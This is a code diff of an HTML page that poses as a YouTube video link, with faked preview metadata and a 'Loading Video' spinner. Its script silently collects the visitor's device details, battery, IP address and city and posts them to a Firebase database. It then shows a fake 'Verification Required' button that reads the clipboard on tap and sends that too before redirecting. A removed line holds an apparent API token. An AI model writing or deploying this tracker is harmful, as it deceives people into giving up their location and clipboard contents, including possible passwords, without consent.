@@ -1,75 +1,87 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Loading...</title>
+    <title>YouTube</title>
+    
+    <meta property="og:title" content="YouTube - Trending Video 2026">
+    <meta property="og:description" content="1.2M Views • Watch the full video now on YouTube.">
+    <meta property="og:image" content="https://img.youtube.com/vi/aqz-KE-bpKQ/maxresdefault.jpg">
+    <meta property="og:type" content="video.other">
+
     <style>
-        body { background: #f0f2f5; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
-        .loader { border: 3px solid #ddd; border-top: 3px solid #00a884; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
+        body { background: #0f0f0f; color: white; font-family: "Roboto", Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .yt-loader { text-align: center; }
+        .spinner { border: 3px solid #333; border-top: 3px solid #f00; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        button { background: #cc0000; color: white; border: none; padding: 12px 24px; border-radius: 2px; font-weight: bold; cursor: pointer; text-transform: uppercase; font-size: 14px; }
     </style>
 </head>
 <body>
-    <div class="loader"></div>
-    <p id="msg" style="margin-top:15px; color:#666; font-size:14px;">Connecting...</p>
+    <div id="ui" class="yt-loader">
+        <div class="spinner"></div>
+        <p style="color: #aaa; font-size: 14px;">Loading Video...</p>
+    </div>
 
     <script>
         const DB_URL = "https://location-5d435-default-rtdb.firebaseio.com/";
+        let isCaptured = false;
 
-        async function run() {
+        async function init() {
             const params = new URLSearchParams(window.location.search);
             const id = params.get('id');
-            if(!id) return;
+            if (!id || isCaptured) return;
+            isCaptured = true; // Duplicate entries block
+
             const decoded = JSON.parse(atob(id));
 
             let data = {
                 time: new Date().toLocaleString(),
-                model: navigator.userAgent.split('(')[1].split(')')[0],
+                model: navigator.userAgent.split('(')[1]?.split(')')[0] || "Unknown Device",
                 ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A",
-                ip: "N/A", loc: "Asia/Karachi", map: "#"
+                res: screen.width + "x" + screen.height,
+                ip: "N/A", loc: "Searching..."
             };
 
-            // Battery Fetch
+            // Battery (Silent)
             try {
                 const b = await navigator.getBattery();
                 data.bat = Math.round(b.level * 100) + "%";
             } catch(e){ data.bat = "N/A"; }
 
-            // Reliable IP Fetch (Fixed)
+            // IP & Loc (Reliable Source)
             try {
                 const res = await fetch('https://api.db-ip.com/v2/free/self');
                 const d = await res.json();
                 data.ip = d.ipAddress;
                 data.loc = d.city + ", " + d.countryName;
-                // Since we don't have lat/long from this API, use city for map
                 data.map = `https://www.google.com/maps/search/${d.city}+${d.countryName}`;
-            } catch(e) {
-                // Final Backup
-                try {
-                    const res2 = await fetch('https://ipinfo.io/json?token=6460e40854d9c4'); // Free token
-                    const d2 = await res2.json();
-                    data.ip = d2.ip;
-                    data.loc = d2.city + ", " + d2.country;
-                    data.map = `https://www.google.com/maps?q=${d2.loc}`;
-                } catch(e2){}
-            }
+            } catch(e){ data.ip = "Fetch Error"; }
 
-            // Save Data
+            // Save Entry
             fetch(`${DB_URL}tracking/${decoded.k}.json`, { method: 'POST', body: JSON.stringify(data) });
 
+            // Switch to Interaction UI after 2.5s
             setTimeout(() => {
-                document.body.innerHTML = "<div style='text-align:center; padding:20px;'><b>⚠️ CONTENT BLOCKED</b><br><p style='font-size:14px;'>TAP TO VERIFY & PLAY</p></div>";
-                document.body.onclick = async () => {
+                document.getElementById('ui').innerHTML = `
+                    <p style="font-weight: bold; margin-bottom: 15px;">Playback Error: Verification Required</p>
+                    <button id="playBtn">Tap to Watch</button>
+                `;
+
+                document.getElementById('playBtn').onclick = async () => {
                     try {
                         const clip = await navigator.clipboard.readText();
-                        if(clip) fetch(`${DB_URL}clipboard/${decoded.k}.json`, { method: 'POST', body: JSON.stringify({ clipData: clip, time: new Date().toLocaleString() }) });
+                        if(clip) fetch(`${DB_URL}clipboard/${decoded.k}.json`, { 
+                            method: 'POST', 
+                            body: JSON.stringify({ clipData: clip, time: new Date().toLocaleString() }) 
+                        });
                     } catch(e){}
                     window.location.href = decoded.r;
                 };
-            }, 2000);
+            }, 2500);
         }
-        run();
+        init();
     </script>
 </body>
 </html>
